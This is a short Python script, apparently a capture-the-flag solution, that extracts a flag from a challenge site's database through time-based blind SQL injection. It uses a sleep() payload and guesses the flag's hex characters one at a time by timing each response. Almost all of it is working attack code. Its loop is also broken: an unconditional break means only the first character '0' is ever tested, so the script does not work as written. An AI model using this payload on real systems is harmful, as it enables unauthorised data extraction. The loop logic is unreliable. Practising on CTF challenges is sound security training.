from inj_class import Inj
import time 


inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')
payload = "1' and (select sleep(1) from flags where HEX(flag) LIKE '{}%')='1"
dictionary = '0123456789abcdef'
result = ''
i = 0

while True:
    for c in dictionary:
        i= i+1
        print('prova ', i)
        before_request = time.time()
        question = payload.format(result + c)  
        response, error = inj.blind(question)
        total_time = time.time()-before_request 
        
        if total_time > 1:
            # match!
            result += c
        break
    else:
        break # yup, for loops in python have an else condition
print(bytes.fromhex(result))